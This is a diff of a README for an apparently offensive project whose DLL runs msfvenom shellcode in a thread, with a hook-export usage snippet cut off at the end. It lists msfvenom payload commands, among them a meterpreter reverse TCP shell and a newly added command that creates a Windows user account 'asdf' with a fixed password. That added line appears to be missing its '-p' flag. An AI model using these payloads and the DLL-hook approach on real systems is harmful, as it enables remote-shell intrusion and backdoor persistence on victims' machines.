@@ -4,7 +4,8 @@ dllmain.cpp: Launches a thread that launches an msfvenom payload whenever it is 
 ## Payloads that have been tested with this project
 `msfvenom -f c -p windows/x64/messagebox EXITFUNC=thread TEXT="Hello, from urmom"` </br>
 `msfvenom -f c -p windows/x64/meterpreter_reverse_tcp EXITFUNC=thread RHOST=127.0.0.1 RPORT=4444  -o file.txt` </br>
-`msfvenom -f c -p windows/x64/exec CMD=calc.exe EXITFUNC=thread`
+`msfvenom -f c -p windows/x64/exec CMD=calc.exe EXITFUNC=thread` </br>
+`msfvenom -f c windows/x64/exec CMD="net user asdf Qwerty123 /add"`
 ## Usage
 1. Just add this to your dll:
 extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam) {
